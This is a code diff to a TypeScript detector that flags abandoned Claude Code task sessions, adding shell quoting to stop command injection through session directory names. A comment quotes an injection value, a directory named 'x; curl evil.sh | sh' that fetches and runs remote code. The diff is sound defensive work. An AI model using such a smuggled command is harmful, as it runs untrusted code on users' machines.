@@ -17,6 +17,24 @@ import { COLD_DAYS } from '../../parse-tasks';
 
 const MS_PER_DAY = 24 * 60 * 60 * 1000;
 
+/**
+ * POSIX single-quote a value so it survives a copy-pasted shell command as ONE
+ * inert literal argument.
+ *
+ * `sessionId` is a directory entry name read from `~/.claude/tasks/` — the
+ * parser does not constrain it to UUID characters — so interpolating it raw
+ * into a command let a directory called `x; curl evil.sh | sh` run whatever it
+ * liked the moment the user copied the "fix" (#3230). Inside single quotes the
+ * shell expands nothing: `;`, `|`, `&`, backticks, `$(…)`, `*`, and newlines are
+ * all literal. The one character single quotes cannot contain is `'` itself,
+ * so each is closed, escaped, and reopened — the standard `'\''` idiom used
+ * elsewhere in this repo (`repeated-command-snippet.ts`,
+ * `config-hygiene-actions.ts`).
+ */
+export function shellQuote(value: string): string {
+  return `'${value.replace(/'/g, `'\\''`)}'`;
+}
+
 export const detector: Detector = {
   id: 'workflow.abandoned-tasks',
   category: 'workflow',
@@ -77,11 +95,15 @@ export const detector: Detector = {
         `${short(a.sessionId)}: ${a.count} open task(s), ${a.daysSinceActive}d idle`
     );
 
+    // The session directory is passed as ONE separately shell-quoted argument
+    // (never spliced into the command text), and `find … -exec jq … {} +` keeps
+    // the whole thing a single command with no shell glob to expand (#3230).
     const fixSnippet = abandoned
       .slice(0, 3)
       .map(
         (a) =>
-          `cat ~/.claude/tasks/${a.sessionId}/*.json | jq 'select(.status!="completed") | .subject'`
+          `find ~/.claude/tasks/${shellQuote(a.sessionId)} -maxdepth 1 -name '*.json' ` +
+          `-exec jq 'select(.status!="completed") | .subject' {} +`
       )
       .join('\n');
 
@@ -102,8 +124,20 @@ export const detector: Detector = {
       fix: {
         target: 'command',
         label: 'Inspect abandoned tasks',
+        // Declared, never inherited (an absent fixKind silently defaults to
+        // 'validated' — the #3221 failure mode). NOT 'validated', though: this
+        // is a POSIX-shell command depending on `jq`, a third-party binary the
+        // project never lists as a prerequisite (stated requirements are Claude
+        // Code and Node >= 24), and docs/plugin-mirror-README.md advertises
+        // "Works on Windows, macOS, and Linux" — on Windows there is no POSIX
+        // `find`, no `~` expansion, and no `jq`. That is the textbook 'manual'
+        // case: "depends on an external tool or per-environment state; apply by
+        // hand where that tool exists". The command is still correct and
+        // read-only, and its session id stays shell-quoted (#3230) — it simply
+        // is not universally paste-safe, so it must not be offered as one-click.
+        fixKind: 'manual',
         note:
-          'Run per-session to list tasks never completed. Close or reassign each one.',
+          'Run per-session to list tasks never completed, then close or reassign each one. Needs a POSIX shell with `jq` available (on Windows use WSL or Git Bash); adapt the traversal if your environment differs.',
         snippet: fixSnippet,
       },
     };
